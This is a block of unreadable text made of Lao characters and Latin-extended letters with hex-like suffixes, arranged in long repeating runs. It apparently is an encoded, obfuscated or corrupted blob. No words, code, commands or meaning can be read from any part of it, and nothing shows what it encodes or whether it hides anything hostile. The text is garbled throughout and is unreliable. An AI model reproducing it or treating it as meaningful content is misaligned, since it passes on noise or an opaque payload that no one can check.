ີŸdŴbŸdŸcŷfŸdŸeາŴcŷeŸeຶŸeຸŸbຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທŷcັແງອŸeŷeŸaŸdŵcຂŸcຸŷe຿຿ŴaອູີຳŴbືŸdຳັŴbŷbŸcະືຉŷeŸcູ຾ະŸeųfŵaດຸູຫະງŷaິຮືŸfŵaųeິŸcŸbຶຉŷfŸeŷc຺຀Ÿeາ຺Ÿaųbŵbຝຳŷfະິິ຀ຈŷeŸbŸeຒງອຳŸbŸaູຳູຖທຑŸbŸdŷeະຒທŸaຸຮະųaŷcິຯຸŸcຓຂຶŷaູŸdຉŸcຸŷe຿຿ŴaŸbິŷe຺ŴbຐບຼŴeດຆŵfທ຋ືູຮŸaŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeາŴdຆŷbັŷeືືŵaງືŸdŸeີŸbຳŴdູາŹaຶງືືຶŸaຑŷcູືຸŴaິຳŷf຾຺ŴcຫູຸຽŸcູųfຒຎຍຒຕŴfŵeŴbັŴcŵcຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŴbŷdື຾ŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉໃŸbະŸcŴcັŸbŷfືາຶŴaອຳŸbŸbŷfະະັŸfųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcຽŸdŸdŸeŴaŸbŸfŷbຶŸeູųfŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉໃŸbະŸcŴcັŸbŷfືາຶŴaຶຳູງŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeŷdະຼųfອຶŷeŸdŸbŵeųfາິຶŷaຳŴcອັີິŴdັາຸຶŴaຮິະŸbຸųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŷcŴdືີູŹaŴaະŸaຳŸdຸາຆືŷaູຉຍງັຽŸaຶີຳແŴdຮຸະຶາŸdŸcŴcືŸeŷeŸeŸaųdŷeŸeŸdະŸdŴbະຶັŸaŸdŴdຮາະຶາູųeŵdŵeŸfູŷfŸcųdŷcŸeຫŸcŸaŵbງາŸcຶŷdີŴeŸdຫŸbງີູŸdຶຑັຳຯຯາິຉŴeງŵaຜຘŶc຋ŸaຮຸູŵfŵeŸcŵdŴdທຊຣທຑŸbŵfງŵeສງŸaŸc຺ŸeັŵaųeŷbŸcີຳິນųfັູູັŸbທຆŵfຟຠລພຕຑຯຒຘຐŸdŸeŷaŸbຒŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕຬີຽຆŷbັŷeືືŵaງŸeŸeສົົŴbຮເŸdຶຳŸbŴcŸbŸeສີີຳຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸbຸສໃົŴcŷe຾ຶŸeຸŸaŴdຮຸະຶŷeະŸaິິųcŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵeສຼŸbŸcŸeະųaŸdແŸeຶŵaຂສຼŸbŸcŸeະųcງູŸcຮີŸdອິŵcųeŷaŸeŷdຶŸbຎຊųf຀ອີຮŸdŸaຓųcŷfŸcŸcŴeະິຳ຺ŸbະŴcັŷeງŷeŸaŸfŴaຸໃີຳŴbເŸdŷeŸdະųeŷbŷeຬŸbາŴcŷdŸeະŸeŷeືŸcຶŸf຀ຬŴaີິິŹaųaŷeິັິŸbຉŸdŸdິŸbŸaຉŷfາŸaŸaຶŸf຀ŸcຼŸaŸcະຸ຿ŴaŷdŸfŸfŸdູະŸdŴcŷdິະŸeາŸeųeŷbŸdະຉູູືŸcຫŸcເŴbŸdຯງສຶŸbŴcŸbະະຑ຺ືŷaູັຂຒທŸaຸຮະųaŷcິຯຸŸcຓຂຶŷaູŸdຉŸcຸŷe຿຿ŴaŹbŸaຶŸbຳງຒຘຐŸdŸeŷaŸbຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖຶຑງອŸeŷeŸaŸdŵcຂີŸbິັŸfາຉຶາແŸcງຒŴcຍŴeŴeŴdທ຋ŸaŴdŵdຖŴeສົŸdŸcŸfŸfŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທŴeŷcະໂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓŷdŸdໂງŷaິຮືŸfŵaųeຸŸcŷfໃŹaŴa຾ŸaະຶຑŸaູຮາີູຉŷfŸeŸcŸbຳູųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷeຶຼųeຮີຫືŸcŵcųeູຳŷcຼ຺ŴdຮາŸeŸeŴaືືຶŸaຑŷcູືຸŴaຫັຸ຾ŸaŸbຂບທŸdŸeŷaŸb຀ອີຮŸdŸaຓųcຳູŸcູŴaສຳŷd຺ຆŸbູຼŸdųeŵcŶeຸສŸdີິຆຍຫູູທųeຮຸະືຸຳຳຓŵeŴbŸcຸຯŸfŵbŵeືູຮŸaųfອຶŷeŸdŸbŵeųfŸdອຸŸdŴbູຳŷcຼ຺ŴdິŸfຫŹdŴaຐດແຍຒųfŵaດŴcŸcາຫŸbŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖືຎųaŷcິຯຸŸcຓຂຶŸdິະະັŴaŸcີ຿Ÿd຀ŸaຶຶະŴcອŸbະŸdŴdŸbຸສໃົŴcŷfŸcຳົŸbŸcຆŵfŴeŴeŵaຒŴfຖŴeŸaŴeŵbຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘຐŷcັແŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeຼະŸdŸdŴcŸbŸeສີີຳŴdຮຸະຶŷeະŸaິິųcŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŸeŸfŷbຼŹaຉຼŸdືŸbຉູຸŷeັັາຂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘŷdື຾ųdŷcŸeຫŸcŸaŵbງິŸbŷfຽເŴeຼະŸdŸdŴcŸbŸeສີີຳŴdູຸາຂŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŸdŸfŸdອາŴcŷdິŸeຶŴaິີືŸdຉຫີະັŸdຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທŷcັແງອŸeŷeŸaŸdŵcຂŷeŴaາາຶົຉŸdŸbຳືŸdູųaະŷfŸeŴeŴe຀ŸcຼŸaŸcະຸ຿ŴaŷdŸfŸfŸdູະŸdŴcŸdŸbຫŸcŸdຆຯັຶŸbະŴaະŸcິັŸfŴaŷdີŸfŸdູິųfŵdຖŸaາŷdŸbຆŷbັŷeືືŵaງຸູŸdŷfາŴbŸaŷaະ຀ຸຸŸdŸcŴcŸaັŷeŷcີŸbŴaຍຂŵbຜŵcລຐຸŷfŸdŸeຒທືຒŴeນຐພŵeŴbŸcŵaųeຓŷf຀ືŸd຺ິິຓųcŷcູາŸcŸfŵc຀ະູຳິະນųfŵaຠŶbພລŵeຐຯŵaຕ຋ŸfູŷfŸcŵfທ຋ຬຶ຿ŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂŸfŸeŷe຾ŹaຑŷfຽŸaູຸະຉŸaŸeŷeະŸeັųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŸeŸfŷbຼŹaຉŷf຾ŸcŸbຳຸŴaŷdŸfŸfŸdຫŸdŸbິŸeງຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓŷfໃຶŸdŸeŸaųfຶ຿ູຳŵdųbŷfໃຶŸdŸeŸaງ຀ŸbŸbŷdາາŷcŸfຓųfŷaິຮŸdູຉຏຆųdŷcŸeຫŸcŸaŵbງສŸeŸbŴbືŸbຸŹbຶັŴcŸbŷb຀ŷcŸdŸaŴdືຼŸeŸeŴaເືŷbຶາງŷeຯຯະູຉŷcŸeŸaŸbຫີŸbຳຸųdŷdຉຸີິ຺ųfຫຶຶັŸcŴeຶຶູŸaŸaŴbŷaູຸŸdຳຸųdືໃືŸdະາ຺ຉŷfຸŸaŸaຶŸbຶຉŷcິŸaŸbູŸcງŷeŸaŸfŴaາິຶŸcŷfູŹdຑŸaŷcųeŷbŸdະຉŸaະŸaŴcŹbີŷdŸcຶųbŵbŵeືູຮŸaųfອຶŷeŸdŸbŵeųfŸdອຸŸdŴbູຳŷcຼ຺Ŵd຾ັŸdຶາງŵaຕ຋ŸfູŷfŸcŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘັŴcųeຮີຫືŸcŵcųeະະຶຶŸaີŴeŸdູŹaŸdງŵaຐŴeŴdຑຐດŴcັຎຒທŴeŷe຾ຶŸeຸŸaŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcŸfູຮເົຉໃŸbະŸcŴcັŸbŷfືາຶŴaສຳŸdŸbູŸcຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŷbŸd຺ງŷdາŷaŸcືຓųfູູຯໃຼŴaŷdີັີຉŸaຶຶະŴcອŸbະŸdŴdŷaŸaຳໃŸbŸbųeŵdŵeŸfູŷfŸcųdŷcŸeຫŸcŸaŵbງຸŸbŸbŸcŴdŷbຸຬŹdງŸbຳແຶųcŵbŶbŸfŷbຶŸeູງຍŷfŸcານງŷdŸfŸfŸcຳŸeາຓຖŴeືŸaŷeŸaŵcຓŸcາຫŸbųfŷdຳຫŸfŸcŵbຆາŷcຳະŴaູູຯໃຼŴaັຸŷaເຉຍຕແŴfທຂບທຑŸbŸdŷeະຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທືŴcųfອຶŷeŸdŸbŵeųfŸdະີະŸaິຉŸeາ຺ŸaųdັŸdŸbັŴcŷdŸeŸbŸfŴaŸeŸfŷbຼŹaຉŷeŸcູ຾ະŸeųfŵaຘທຑŵe຋ັŴbŵaຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດŴcŷdŸdໂŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂŸfŸeŷe຾ŹaຑຼŸaັູŴaັຳŷfະິິຉŷfຸŸaŸaŷaຶະູŸfງŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷeຶຼųeຮີຫືŸcŵcųeູຳŷcຼ຺ŴdເŸbŸdຶŴaŸcູຯŸdຶາųeŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕŷcະໂųaŷcິຯຸŸcຓຂŸfŸeŷe຾ŹaຑຼŸaັູŴaັຳŷfະິິຉŸeຸຸຆŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທŷcັແງອŸeŷeŸaŸdŵcຂŸaŸfືŷbຶŴaອູີຳŴbຳູະŸdŴbຯັຶŸbະųfŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŷbŸd຺ງŷdາŷaŸcືຓųfŷbŴbີŸeັົŴbັŸfີŸdະາųfັຮາຑŴeຆະເŸcຶŸdຳ຺ŴbŷaຳຸŸdຳŸcູŴaືຶŷeູŸcųfຫຶຶັŸcŴeຶຶູŸaŸaŴbŷaູຸŸdຳຸųbŵbŵeືູຮŸaųfອຶŷeŸdŸbŵeųfາິຶŷaຳŴcຶŷdະຆິŸcŸbຶຉັິŷfŷbູŸcŴaŴfຆŵfຢຘຠ຋ŸdŷeŸaານທŸdŵcດຑŶfŵeຐŸaŵaųfŵeŷcງŸdŸaຼີູຓųfŷaູຳຳŸcນຆືŸbາູະຖງŵaມຠຝພຖŴfŷbŵbŵe຋ŸcŸfŷfŸdຒຘຐŷcັແŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓŷdŸdໂງŷaິຮືŸfŵaųeຸŸcŷfໃŹaŴaຯຽŸbຶŸbŸbŴbŸdŸcŷfŸdŸeາງŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕຬີຽຆŷbັŷeືືŵaງŸeŸeສົົŴbຮເŸdຶຳŸbŴcŷdŸeະŸeŷeືŸcຶŸfຂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷcຼŸcŸaŸcŸb຀ຶເŸfຳŵcຂŷcຼŸcŸaŸcŸbຂ຀ຸŸdŷdຳŸdŷfິŵbຆຮີຫŸdŸaຏຏງ຀ŷfີŷfŸbຸŵaຂສŸdŸdŴbຶິŸb຺ŸcຶŴeŸaຬ຀ŷfŸbŸaŴcຸົີິŴd຾ຶຬຶັųfŷeຮຬຳາŴbŷbŸcŸbຶຫຶŸdຳູ຀ŷeŴaາາຶົ຀ຫີະັŸdຉີŸdຳŸdຸŴaອູŸbŸbຳູ຀ິຼŸdŸaາຳŹdຉŷcŸeŸaŸbູຸŸdŴbŷbຶŸbຶູŸfųfŷeŸbະຑູŸeັŸeŷeິŹdŴaŸcŷcųfສŸeŸbŴbŸdາŸbຉŹbຶŷbŸcືຂບທŸdŸeŷaŸb຀ອີຮŸdŸaຓųcຶŷdŸfŸfŴaິຳŷf຾຺ŴcŹbາຶŸcີųbŵbŵe຋ŸcŸfŷfŸdຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທືŴcųfອຶŷeŸdŸbŵeųfŸdະີະŸaິຉŸeາ຺ŸaųbŵbປປຑຕຑືຎບທຑຮເŸdຶຳŸbŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŴbŷdື຾ŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ທŷbື຿຀ŷfີŷfŸbຸŵaຂິຸຯຽແຉົŸbືŸaŴeŸaຳສຶຳຳŴcສŸbŸdŸcŸfŸeųfຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດຯຶໂ຀ŷcຳŷfŸaືປųfŸeŸfŷbຼŹaຉŷcິິຳຉາຶັຶŴeŷcຳŸbŸcŴcŷfŸcຳົŸbŸcຆŵfທືາŷeŸdຆŷaŸeŷdŸcŸdŵdųbຳຳະŸdŴcŷeŸeຬ຿ງŸcີ຿ŸdຂຒŶaŸeŷeະŸeັງຊຯŸeູŵf຀ŷcŸeŸaŸaຳຶາຘດŴcŸcາຫŸbŵdຖŸaາŷd